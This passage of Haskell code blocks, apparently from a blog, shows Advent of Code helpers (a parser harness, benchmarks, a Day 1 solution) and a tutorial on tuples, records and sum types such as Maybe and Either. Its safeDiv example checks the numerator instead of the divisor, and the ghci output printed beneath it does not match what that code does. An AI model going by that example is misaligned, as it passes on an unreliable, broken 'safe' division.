<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">trace'</span> <span class="token hvariable">x</span> <span class="token operator">=</span> <span class="token hvariable">trace</span> <span class="token punctuation">(</span><span class="token builtin">show</span> <span class="token hvariable">x</span><span class="token punctuation">)</span> <span class="token hvariable">x</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">counter</span> <span class="token operator">=</span> <span class="token builtin">foldr</span> <span class="token punctuation">(</span><span class="token operator">\</span><span class="token hvariable">x</span> <span class="token operator">-&gt;</span> <span class="token hvariable">M<span class="token punctuation">.</span>insertWith</span> <span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">)</span> <span class="token hvariable">x</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token hvariable">M<span class="token punctuation">.</span>empty</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">counter</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token operator">=</span> <span class="token hvariable">M<span class="token punctuation">.</span>fromList</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">ghci</span><span class="token operator">&gt;</span> <span class="token hvariable">counter</span> <span class="token operator">=</span> <span class="token builtin">foldr</span> <span class="token punctuation">(</span><span class="token operator">\</span><span class="token hvariable">x</span> <span class="token operator">-&gt;</span> <span class="token hvariable">M<span class="token punctuation">.</span>insertWith</span> <span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">)</span> <span class="token hvariable">x</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token hvariable">M<span class="token punctuation">.</span>empty</span>
<span class="token hvariable">ghci</span><span class="token operator">&gt;</span> <span class="token operator">:</span><span class="token hvariable">t</span> <span class="token hvariable">counter</span>
<span class="token hvariable">counter</span>
  <span class="token operator">::</span> <span class="token punctuation">(</span><span class="token constant">Foldable</span> <span class="token hvariable">t</span><span class="token punctuation">,</span> <span class="token constant">Eq</span> <span class="token hvariable">k</span><span class="token punctuation">,</span>
      <span class="token hvariable">hashable</span><span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span><span class="token number">1.0</span><span class="token operator">:</span><span class="token constant">Data<span class="token punctuation">.</span>Hashable<span class="token punctuation">.</span>Class<span class="token punctuation">.</span>Hashable</span> <span class="token hvariable">k</span><span class="token punctuation">,</span> <span class="token constant">Num</span> <span class="token hvariable">v</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span>
     <span class="token hvariable">t</span> <span class="token hvariable">k</span> <span class="token operator">-&gt;</span> <span class="token constant">M<span class="token punctuation">.</span>HashMap</span> <span class="token hvariable">k</span> <span class="token hvariable">v</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">counter</span> <span class="token operator">::</span> <span class="token punctuation">(</span><span class="token constant">Foldable</span> <span class="token hvariable">t</span><span class="token punctuation">,</span> <span class="token constant">Eq</span> <span class="token hvariable">k</span><span class="token punctuation">,</span> <span class="token constant">Hashable</span> <span class="token hvariable">k</span><span class="token punctuation">,</span> <span class="token constant">Num</span> <span class="token hvariable">v</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> 
            <span class="token hvariable">t</span> <span class="token hvariable">k</span> <span class="token operator">-&gt;</span> <span class="token constant">M<span class="token punctuation">.</span>HashMap</span> <span class="token hvariable">k</span> <span class="token hvariable">v</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">digits</span> <span class="token operator">=</span> <span class="token builtin">read</span> <span class="token operator">&lt;$&gt;</span> <span class="token hvariable">some</span> <span class="token hvariable">digitChar</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">integer</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">negate</span> <span class="token operator">&lt;$&gt;</span> <span class="token hvariable">try</span> <span class="token punctuation">(</span><span class="token hvariable">char</span> <span class="token char string">'-'</span> <span class="token operator">*&gt;</span> <span class="token hvariable">digits</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;|&gt;</span> <span class="token hvariable">digits</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">defaultMain</span>
  <span class="token operator">::</span> <span class="token punctuation">(</span><span class="token constant">ParseLike</span> <span class="token hvariable">p</span><span class="token punctuation">,</span> <span class="token constant">Print</span> <span class="token hvariable">b</span><span class="token punctuation">,</span> <span class="token constant">Print</span> <span class="token hvariable">c</span><span class="token punctuation">)</span>
  <span class="token operator">=&gt;</span> <span class="token constant">String</span>   <span class="token comment">-- Default input file, if no -f option was provided from args.</span>
  <span class="token operator">-&gt;</span> <span class="token hvariable">p</span> <span class="token hvariable">a</span>      <span class="token comment">-- Any instance of ParseLike, e.g. a function (String -&gt; a) or a parser combinator (Parser a).</span>
  <span class="token operator">-&gt;</span> <span class="token punctuation">(</span><span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token hvariable">b</span><span class="token punctuation">)</span> <span class="token comment">-- Function to solve part 1. Takes in input and returns something printable.</span>
  <span class="token operator">-&gt;</span> <span class="token punctuation">(</span><span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token hvariable">c</span><span class="token punctuation">)</span> <span class="token comment">-- Function to solve part 2.  -- Ditto. --</span>
  <span class="token operator">-&gt;</span> <span class="token constant">IO</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token hvariable">defaultMain</span> <span class="token hvariable">defaultFile</span> <span class="token hvariable">parse</span> <span class="token hvariable">part1</span> <span class="token hvariable">part2</span> <span class="token operator">=</span> <span class="token keyword">do</span>
  <span class="token punctuation">(</span><span class="token hvariable">opts</span><span class="token punctuation">,</span> <span class="token hvariable">_</span><span class="token punctuation">)</span>  <span class="token operator">&lt;-</span> <span class="token hvariable">parseArgs</span> <span class="token punctuation">(</span><span class="token hvariable">nullOpts</span> <span class="token punctuation">{</span> <span class="token hvariable">file</span> <span class="token operator">=</span> <span class="token hvariable">defaultFile</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;$&gt;</span> <span class="token hvariable">getArgs</span>
  <span class="token hvariable">input</span> <span class="token operator">&lt;-</span> <span class="token hvariable">doParse</span> <span class="token hvariable">parse</span> <span class="token punctuation">(</span><span class="token hvariable">file</span> <span class="token hvariable">opts</span><span class="token punctuation">)</span> <span class="token operator">&lt;$&gt;</span> <span class="token builtin">readFile</span> <span class="token punctuation">(</span><span class="token hvariable">file</span> <span class="token hvariable">opts</span><span class="token punctuation">)</span>
  <span class="token hvariable">when</span> <span class="token punctuation">(</span><span class="token hvariable">runPart1</span> <span class="token hvariable">opts</span><span class="token punctuation">)</span> <span class="token operator">$</span> <span class="token keyword">do</span>
    <span class="token builtin">putStr</span> <span class="token string">"part1: "</span>
    <span class="token builtin">print</span>' <span class="token operator">$</span> <span class="token hvariable">part1</span> <span class="token hvariable">input</span>
  <span class="token hvariable">when</span> <span class="token punctuation">(</span><span class="token hvariable">runPart2</span> <span class="token hvariable">opts</span><span class="token punctuation">)</span> <span class="token operator">$</span> <span class="token keyword">do</span>
    <span class="token builtin">putStr</span> <span class="token string">"part2: "</span>
    <span class="token builtin">print</span>' <span class="token operator">$</span> <span class="token hvariable">part2</span> <span class="token hvariable">input</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token keyword">class</span> <span class="token constant">ParseLike</span> <span class="token hvariable">p</span> <span class="token keyword">where</span>
  <span class="token comment">-- Parser object, filename, contents -&gt; result.</span>
  <span class="token hvariable">doParse</span> <span class="token operator">::</span> <span class="token hvariable">p</span> <span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token constant">String</span> <span class="token operator">-&gt;</span> <span class="token constant">String</span> <span class="token operator">-&gt;</span> <span class="token hvariable">a</span>

<span class="token keyword">instance</span> <span class="token constant">ParseLike</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-&gt;</span><span class="token punctuation">)</span> <span class="token constant">String</span><span class="token punctuation">)</span> <span class="token keyword">where</span>
  <span class="token hvariable">doParse</span> <span class="token hvariable">f</span> <span class="token hvariable">_</span> <span class="token operator">=</span> <span class="token hvariable">f</span>  <span class="token comment">-- Apply a parse function `f` on `contents`.</span>

<span class="token keyword">instance</span> <span class="token constant">ParseLike</span> <span class="token constant">Parser</span> <span class="token keyword">where</span>
  <span class="token hvariable">doParse</span> <span class="token hvariable">p</span> <span class="token hvariable">file</span> <span class="token hvariable">txt</span> <span class="token operator">=</span> <span class="token keyword">case</span> <span class="token hvariable">runParser</span> <span class="token hvariable">p</span> <span class="token hvariable">file</span> <span class="token hvariable">txt</span> <span class="token keyword">of</span>
    <span class="token constant">Right</span> <span class="token hvariable">res</span> <span class="token operator">-&gt;</span> <span class="token hvariable">res</span>
    <span class="token constant">Left</span>  <span class="token hvariable">err</span> <span class="token operator">-&gt;</span> <span class="token hvariable">T<span class="token punctuation">.</span>trace</span> <span class="token punctuation">(</span><span class="token hvariable">errorBundlePretty</span> <span class="token hvariable">err</span><span class="token punctuation">)</span> <span class="token builtin">undefined</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">main</span> <span class="token operator">::</span> <span class="token constant">IO</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token hvariable">main</span> <span class="token operator">=</span> <span class="token hvariable">defaultMain</span> <span class="token hvariable">defaultFile</span> <span class="token hvariable">parse</span> <span class="token hvariable">part1</span> <span class="token hvariable">part2</span>

<span class="token hvariable">defaultFile</span> <span class="token operator">::</span> <span class="token constant">String</span>
<span class="token hvariable">defaultFile</span> <span class="token operator">=</span> <span class="token string">"../input/d01.txt"</span>

<span class="token hvariable">parse</span> <span class="token operator">::</span> <span class="token constant">String</span> <span class="token operator">-&gt;</span> <span class="token punctuation">[</span><span class="token constant">Int</span><span class="token punctuation">]</span>
<span class="token hvariable">parse</span> <span class="token operator">=</span> <span class="token builtin">map</span> <span class="token builtin">read</span> <span class="token operator">.</span> <span class="token builtin">lines</span>

<span class="token hvariable">part1</span> <span class="token operator">::</span> <span class="token punctuation">[</span><span class="token constant">Int</span><span class="token punctuation">]</span> <span class="token operator">-&gt;</span> <span class="token constant">Int</span>
<span class="token hvariable">part1</span> <span class="token hvariable">xs</span> <span class="token operator">=</span> <span class="token builtin">length</span> <span class="token operator">$</span> <span class="token builtin">filter</span> <span class="token punctuation">(</span><span class="token builtin">uncurry</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">$</span> <span class="token builtin">zip</span> <span class="token hvariable">xs</span> <span class="token punctuation">(</span><span class="token builtin">tail</span> <span class="token hvariable">xs</span><span class="token punctuation">)</span>

<span class="token hvariable">part2</span> <span class="token operator">::</span> <span class="token punctuation">[</span><span class="token constant">Int</span><span class="token punctuation">]</span> <span class="token operator">-&gt;</span> <span class="token constant">Int</span>
<span class="token hvariable">part2</span> <span class="token hvariable">xs</span> <span class="token operator">=</span>
  <span class="token hvariable">part1</span> <span class="token operator">$</span> <span class="token builtin">map</span> <span class="token punctuation">(</span><span class="token operator">\</span><span class="token punctuation">(</span><span class="token hvariable">a</span><span class="token punctuation">,</span> <span class="token hvariable">b</span><span class="token punctuation">,</span> <span class="token hvariable">c</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token hvariable">a</span> <span class="token operator">+</span> <span class="token hvariable">b</span> <span class="token operator">+</span> <span class="token hvariable">c</span><span class="token punctuation">)</span> <span class="token operator">$</span> <span class="token builtin">zip3</span> <span class="token hvariable">xs</span> <span class="token punctuation">(</span><span class="token builtin">tail</span> <span class="token hvariable">xs</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">tail</span> <span class="token operator">$</span> <span class="token builtin">tail</span> <span class="token hvariable">xs</span><span class="token punctuation">)</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">criterionMain</span>
  <span class="token operator">::</span> <span class="token punctuation">(</span><span class="token constant">ParseLike</span> <span class="token hvariable">p</span><span class="token punctuation">)</span>
  <span class="token operator">=&gt;</span> <span class="token constant">String</span>   <span class="token comment">-- Default input file, if no -f option was provided from args.</span>
  <span class="token operator">-&gt;</span> <span class="token hvariable">p</span> <span class="token hvariable">a</span>      <span class="token comment">-- Any instance of ParseLike, e.g. a function (String -&gt; a) or a parser combinator (Parser a).</span>
  <span class="token operator">-&gt;</span> <span class="token punctuation">(</span><span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token punctuation">[</span><span class="token constant">C<span class="token punctuation">.</span>Benchmark</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">-- Criterion IO () benchmarking function.</span>
  <span class="token operator">-&gt;</span> <span class="token constant">IO</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token hvariable">criterionMain</span> <span class="token hvariable">defaultFile</span> <span class="token hvariable">parse</span> <span class="token hvariable">getBench</span> <span class="token operator">=</span> <span class="token keyword">do</span>
  <span class="token punctuation">(</span><span class="token hvariable">opts</span><span class="token punctuation">,</span> <span class="token hvariable">rest</span><span class="token punctuation">)</span>  <span class="token operator">&lt;-</span> <span class="token hvariable">parseArgs</span> <span class="token punctuation">(</span><span class="token hvariable">nullOpts</span> <span class="token punctuation">{</span> <span class="token hvariable">file</span> <span class="token operator">=</span> <span class="token hvariable">defaultFile</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;$&gt;</span> <span class="token hvariable">getArgs</span>
  <span class="token hvariable">input</span> <span class="token operator">&lt;-</span> <span class="token hvariable">doParse</span> <span class="token hvariable">parse</span> <span class="token punctuation">(</span><span class="token hvariable">file</span> <span class="token hvariable">opts</span><span class="token punctuation">)</span> <span class="token operator">&lt;$&gt;</span> <span class="token builtin">readFile</span> <span class="token punctuation">(</span><span class="token hvariable">file</span> <span class="token hvariable">opts</span><span class="token punctuation">)</span>
  <span class="token hvariable">withArgs</span> <span class="token hvariable">rest</span> <span class="token operator">$</span> <span class="token hvariable">C<span class="token punctuation">.</span>defaultMain</span> <span class="token operator">$</span> <span class="token hvariable">getBench</span> <span class="token hvariable">input</span></code></pre>
<pre data-lang-off="" class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">main</span> <span class="token operator">::</span> <span class="token constant">IO</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token hvariable">main</span> <span class="token operator">=</span> <span class="token hvariable">criterionMain</span> <span class="token hvariable">defaultFile</span> <span class="token hvariable">parser</span> <span class="token operator">$</span> <span class="token operator">\</span><span class="token hvariable">input</span> <span class="token operator">-&gt;</span>
  <span class="token punctuation">[</span> <span class="token hvariable">C<span class="token punctuation">.</span>bgroup</span> <span class="token string">"part1"</span> <span class="token punctuation">[</span><span class="token hvariable">C<span class="token punctuation">.</span>bench</span> <span class="token string">"part1"</span> <span class="token operator">$</span> <span class="token hvariable">C<span class="token punctuation">.</span>whnf</span> <span class="token hvariable">part1</span> <span class="token hvariable">input</span><span class="token punctuation">]</span>
  <span class="token punctuation">,</span> <span class="token hvariable">C<span class="token punctuation">.</span>bgroup</span>
    <span class="token string">"part2"</span>
    <span class="token punctuation">[</span> <span class="token hvariable">C<span class="token punctuation">.</span>bench</span> <span class="token string">"sum of unions"</span> <span class="token operator">$</span> <span class="token hvariable">C<span class="token punctuation">.</span>whnf</span> <span class="token hvariable">part2</span> <span class="token hvariable">input</span>
    <span class="token punctuation">,</span> <span class="token hvariable">C<span class="token punctuation">.</span>bench</span> <span class="token string">"sum of unions (optimised)"</span> <span class="token operator">$</span> <span class="token hvariable">C<span class="token punctuation">.</span>whnf</span> <span class="token hvariable">part2_optimised</span> <span class="token hvariable">input</span>
    <span class="token punctuation">,</span> <span class="token hvariable">C<span class="token punctuation">.</span>bench</span> <span class="token string">"sum of intersections"</span> <span class="token operator">$</span> <span class="token hvariable">C<span class="token punctuation">.</span>whnf</span> <span class="token hvariable">part2_intersect</span> <span class="token hvariable">input</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">]</span>

<span class="token hvariable">parser</span> <span class="token operator">::</span> <span class="token constant">Parser</span> <span class="token punctuation">[</span><span class="token constant">Command</span><span class="token punctuation">]</span>
<span class="token hvariable">parser</span> <span class="token operator">=</span> <span class="token operator">...</span>

<span class="token hvariable">part1</span> <span class="token operator">::</span> <span class="token punctuation">[</span><span class="token constant">Command</span><span class="token punctuation">]</span> <span class="token operator">-&gt;</span> <span class="token constant">Int</span>
<span class="token hvariable">part1</span> <span class="token hvariable">cmds</span> <span class="token operator">=</span> <span class="token operator">...</span>

<span class="token hvariable">part2</span> <span class="token operator">::</span> <span class="token punctuation">[</span><span class="token constant">Command</span><span class="token punctuation">]</span> <span class="token operator">-&gt;</span> <span class="token constant">Int</span>
<span class="token hvariable">part2</span> <span class="token hvariable">cmds</span> <span class="token operator">=</span> <span class="token operator">...</span>

<span class="token hvariable">part2_optimised</span> <span class="token operator">::</span> <span class="token punctuation">[</span><span class="token constant">Command</span><span class="token punctuation">]</span> <span class="token operator">-&gt;</span> <span class="token constant">Int</span>
<span class="token hvariable">part2_optimised</span> <span class="token hvariable">cmds</span> <span class="token operator">=</span> <span class="token operator">...</span>

<span class="token hvariable">part2_intersect</span> <span class="token operator">::</span> <span class="token punctuation">[</span><span class="token constant">Command</span><span class="token punctuation">]</span> <span class="token operator">-&gt;</span> <span class="token constant">Int</span>
<span class="token hvariable">part2_intersect</span> <span class="token hvariable">cmds</span> <span class="token operator">=</span> <span class="token operator">...</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token comment">-- Haskell Tuple</span>
<span class="token comment">-- -------------</span>
<span class="token comment">-- Haskell separates types from data.</span>
<span class="token hvariable">tuple1</span> <span class="token operator">::</span> <span class="token punctuation">(</span><span class="token constant">Bool</span><span class="token punctuation">,</span> <span class="token constant">Bool</span><span class="token punctuation">)</span> <span class="token comment">-- Type</span>
<span class="token hvariable">tuple1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token constant">True</span><span class="token punctuation">,</span> <span class="token constant">False</span><span class="token punctuation">)</span> <span class="token comment">-- Data</span>

<span class="token comment">-- Here's another tuple:</span>
<span class="token hvariable">tuple2</span> <span class="token operator">::</span> <span class="token punctuation">(</span><span class="token constant">Int</span><span class="token punctuation">,</span> <span class="token constant">String</span><span class="token punctuation">)</span>
<span class="token hvariable">tuple2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token string">"Hello world!"</span><span class="token punctuation">)</span>

<span class="token comment">-- We can have a product type of product types.</span>
<span class="token hvariable">tuple3</span> <span class="token operator">::</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">Int</span><span class="token punctuation">,</span> <span class="token constant">Double</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token constant">Bool</span><span class="token punctuation">,</span> <span class="token constant">Char</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token hvariable">tuple3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3.14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token constant">True</span><span class="token punctuation">,</span> <span class="token char string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">-- Although semantically, it's the same as...</span>
<span class="token hvariable">tuple4</span> <span class="token operator">::</span> <span class="token punctuation">(</span><span class="token constant">Int</span><span class="token punctuation">,</span> <span class="token constant">Double</span><span class="token punctuation">,</span> <span class="token constant">Bool</span><span class="token punctuation">,</span> <span class="token constant">Char</span><span class="token punctuation">)</span>
<span class="token hvariable">tuple4</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3.14</span><span class="token punctuation">,</span> <span class="token constant">True</span><span class="token punctuation">,</span> <span class="token char string">'a'</span><span class="token punctuation">)</span>

<span class="token comment">-- Haskell Data Constructor</span>
<span class="token comment">-- ------------------------</span>
<span class="token comment">-- We define a new type: RectangleType.</span>
<span class="token comment">-- We also define Rect to be a data constructor.</span>
<span class="token comment">-- The data constructor takes 4 integer arguments.</span>
<span class="token keyword">data</span> <span class="token constant">RectangleType</span> <span class="token operator">=</span> <span class="token constant">Rect</span> <span class="token constant">Int</span> <span class="token constant">Int</span> <span class="token constant">Int</span> <span class="token constant">Int</span>

<span class="token comment">-- We can create a RectangleType by passing concrete </span>
<span class="token comment">-- values to the Rect data constructor.</span>
<span class="token hvariable">rect</span> <span class="token operator">::</span> <span class="token constant">RectangleType</span>
<span class="token hvariable">rect</span> <span class="token operator">=</span> <span class="token constant">Rect</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">10</span> <span class="token number">5</span>

<span class="token comment">-- Haskell Record</span>
<span class="token comment">-- --------------</span>
<span class="token comment">-- Let's define a record!</span>
<span class="token comment">-- With Haskell record syntax, we can give names to fields.</span>
<span class="token comment">-- Here, `Person` is both the type and data constructor.</span>
<span class="token keyword">data</span> <span class="token constant">Person</span> <span class="token operator">=</span> <span class="token constant">Person</span> <span class="token punctuation">{</span> <span class="token hvariable">name</span> <span class="token operator">::</span> <span class="token constant">String</span><span class="token punctuation">,</span> <span class="token hvariable">age</span> <span class="token operator">::</span> <span class="token constant">Int</span> <span class="token punctuation">}</span>

<span class="token comment">-- Let's construct a Person type! A person has a name AND an age.</span>
<span class="token hvariable">record</span> <span class="token operator">::</span> <span class="token constant">Person</span>
<span class="token hvariable">record</span> <span class="token operator">=</span> <span class="token constant">Person</span> <span class="token punctuation">{</span> <span class="token hvariable">name</span><span class="token operator">=</span><span class="token string">"Peter Parker"</span><span class="token punctuation">,</span> <span class="token hvariable">age</span><span class="token operator">=</span><span class="token number">16</span> <span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">enum</span> <span class="token class-name">Bool</span> <span class="token punctuation">{</span>
	False<span class="token punctuation">,</span>
	True<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token keyword">data</span> <span class="token constant">Bool</span> <span class="token operator">=</span> <span class="token constant">False</span> <span class="token operator">|</span> <span class="token constant">True</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// C++ Object-Oriented Approach</span>
<span class="token keyword">using</span> Course <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span>string<span class="token punctuation">;</span> <span class="token comment">// For simplicity, a course is simply a string.</span>

<span class="token keyword">class</span> <span class="token class-name">Member</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token keyword">public</span> <span class="token class-name">Member</span></span> <span class="token punctuation">{</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token comment">// A student...</span>
    <span class="token keyword">int</span> year<span class="token punctuation">;</span>                    <span class="token comment">// ...belongs to a year.</span>
    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>Course<span class="token operator">&gt;</span> courses<span class="token punctuation">;</span> <span class="token comment">// ...takes some courses.</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">Teacher</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token keyword">public</span> <span class="token class-name">Member</span></span> <span class="token punctuation">{</span>
<span class="token keyword">public</span><span class="token operator">:</span>
	std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>Course<span class="token operator">&gt;</span> teaches<span class="token punctuation">;</span> <span class="token comment">// A teacher teaches some courses.</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token keyword">type</span> <span class="token constant">Course</span> <span class="token operator">=</span> <span class="token constant">String</span>

<span class="token keyword">data</span> <span class="token constant">Member</span> <span class="token operator">=</span> <span class="token constant">Student</span> <span class="token punctuation">{</span> <span class="token hvariable">year</span> <span class="token operator">::</span> <span class="token constant">Int</span><span class="token punctuation">,</span> <span class="token hvariable">courses</span> <span class="token operator">::</span> <span class="token punctuation">[</span><span class="token constant">Course</span><span class="token punctuation">]</span> <span class="token punctuation">}</span>
			<span class="token operator">|</span> <span class="token constant">Teacher</span> <span class="token punctuation">{</span> <span class="token hvariable">teaches</span> <span class="token operator">::</span> <span class="token punctuation">[</span><span class="token constant">Course</span><span class="token punctuation">]</span> <span class="token punctuation">}</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token keyword">data</span> <span class="token constant">Maybe</span> <span class="token hvariable">a</span> <span class="token operator">=</span> <span class="token constant">Nothing</span> <span class="token operator">|</span> <span class="token constant">Just</span> <span class="token hvariable">a</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">ghci</span><span class="token operator">&gt;</span> <span class="token builtin">divMod</span> <span class="token hvariable">x</span> <span class="token hvariable">y</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token hvariable">x</span> <span class="token operator">`div`</span> <span class="token hvariable">y</span><span class="token punctuation">,</span> <span class="token hvariable">x</span> <span class="token operator">`mod`</span> <span class="token hvariable">y</span><span class="token punctuation">)</span>
<span class="token hvariable">ghci</span><span class="token operator">&gt;</span> <span class="token builtin">divMod</span> <span class="token number">5</span> <span class="token number">2</span>
<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token hvariable">ghci</span><span class="token operator">&gt;</span> <span class="token builtin">divMod</span> <span class="token number">42</span> <span class="token number">2</span>
<span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token keyword">data</span> <span class="token constant">Maybe</span> <span class="token hvariable">a</span> <span class="token operator">=</span> <span class="token constant">Nothing</span> <span class="token operator">|</span> <span class="token constant">Just</span> <span class="token hvariable">a</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">ghci</span><span class="token operator">&gt;</span> <span class="token hvariable">safeDiv</span> <span class="token hvariable">x</span> <span class="token hvariable">y</span> <span class="token operator">=</span> <span class="token keyword">if</span> <span class="token hvariable">x</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">then</span> <span class="token constant">Nothing</span> <span class="token keyword">else</span> <span class="token constant">Just</span> <span class="token punctuation">(</span><span class="token hvariable">x</span> <span class="token operator">`div`</span> <span class="token hvariable">y</span><span class="token punctuation">)</span>
<span class="token hvariable">ghci</span><span class="token operator">&gt;</span> <span class="token hvariable">safeDiv</span> <span class="token number">4</span> <span class="token number">2</span>
<span class="token constant">Just</span> <span class="token number">2</span>
<span class="token hvariable">ghci</span><span class="token operator">&gt;</span> <span class="token hvariable">safeDiv</span> <span class="token number">7</span> <span class="token number">2</span>
<span class="token constant">Just</span> <span class="token number">3</span>
<span class="token hvariable">ghci</span><span class="token operator">&gt;</span> <span class="token hvariable">safeDiv</span> <span class="token number">7</span> <span class="token number">0</span>
<span class="token constant">Nothing</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token keyword">data</span> <span class="token constant">Either</span> <span class="token hvariable">a</span> <span class="token hvariable">b</span> <span class="token operator">=</span> <span class="token constant">Left</span> <span class="token hvariable">a</span> <span class="token operator">|</span> <span class="token constant">Right</span> <span class="token hvariable">b</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">toRHS</span> <span class="token operator">::</span> <span class="token constant">Either</span> <span class="token hvariable">a</span> <span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token punctuation">(</span><span class="token constant">Bool</span><span class="token punctuation">,</span> <span class="token hvariable">a</span><span class="token punctuation">)</span>
